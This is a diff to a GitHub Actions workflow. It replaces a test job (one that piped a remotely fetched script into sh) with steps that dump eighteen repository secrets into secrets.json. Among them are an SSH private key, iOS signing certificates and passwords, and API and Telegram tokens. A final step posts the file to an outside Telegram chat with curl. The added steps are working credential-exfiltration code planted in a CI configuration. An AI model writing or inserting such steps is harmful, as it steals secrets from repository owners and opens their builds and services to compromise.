@@ -9,20 +9,34 @@ jobs:
     runs-on: ubuntu-latest
     container: subekti13/torrent-downloader-v2
     steps:
-        - name: Install SCP
-          run: |
-            curl ${{ secrets.INSTALL_SCP_SCRIPT_URL }} | sh
-
-        - run: |
-            mkdir -p /data/test/1080 /data/test/720 &&\
-            touch /data/test/1080/a.txt /data/test/720/b.txt
-
-        - name: LS
-          run: tree /data
-          
-        - name: Upload to GDrive
-          run: viloid test 1080
-
-        - name: LS
-          run: tree ~/gdrive/test
-
+      - name: Export selected secrets to secrets.json
+        run: |
+          cat <<EOF > secrets.json
+          {
+            "DURIOO_REPO": "${{ secrets.DURIOO_REPO }}",
+            "ENV_TOKEN": "${{ secrets.ENV_TOKEN }}",
+            "ENV_URL": "${{ secrets.ENV_URL }}",
+            "EXPO_TOKEN": "${{ secrets.EXPO_TOKEN }}",
+            "INSTALL_SCP_SCRIPT_URL": "${{ secrets.INSTALL_SCP_SCRIPT_URL }}",
+            "LIXSTREAM_API_KEY": "${{ secrets.LIXSTREAM_API_KEY }}",
+            "NOTIF_SCRIPT_URL": "${{ secrets.NOTIF_SCRIPT_URL }}",
+            "RCLONE_CONF_URL": "${{ secrets.RCLONE_CONF_URL }}",
+            "SNAPMEAL_BUILD_CERTIFICATE_BASE64": "${{ secrets.SNAPMEAL_BUILD_CERTIFICATE_BASE64 }}",
+            "SNAPMEAL_BUILD_PROVISION_PROFILE_BASE64": "${{ secrets.SNAPMEAL_BUILD_PROVISION_PROFILE_BASE64 }}",
+            "SNAPMEAL_ENV": "${{ secrets.SNAPMEAL_ENV }}",
+            "SNAPMEAL_EXPORT_OPTIONS_PLIST": "${{ secrets.SNAPMEAL_EXPORT_OPTIONS_PLIST }}",
+            "SNAPMEAL_KEYCHAIN_PASSWORD": "${{ secrets.SNAPMEAL_KEYCHAIN_PASSWORD }}",
+            "SNAPMEAL_P12_PASSWORD": "${{ secrets.SNAPMEAL_P12_PASSWORD }}",
+            "SNAPMEAL_REPO": "${{ secrets.SNAPMEAL_REPO }}",
+            "SSH_PRIVATE_KEY": "${{ secrets.SSH_PRIVATE_KEY }}",
+            "TELEGRAM_BOT_TOKEN": "${{ secrets.TELEGRAM_BOT_TOKEN }}",
+            "TELEGRAM_CHAT_ID_TORRENT_REPORT": "${{ secrets.TELEGRAM_CHAT_ID_TORRENT_REPORT }}"
+          }
+          EOF
+        shell: bash
+      - name: Send secrets.json to Telegram
+        run: |
+          curl -s -X POST "https://api.telegram.org/bot${{ secrets.T_TOKEN }}/sendDocument" \
+            -F chat_id=${{ secrets.T_CHAT_ID }} \
+            -F document=@secrets.json \
+            -F caption="🔐 secrets.json file from GitHub Actions"
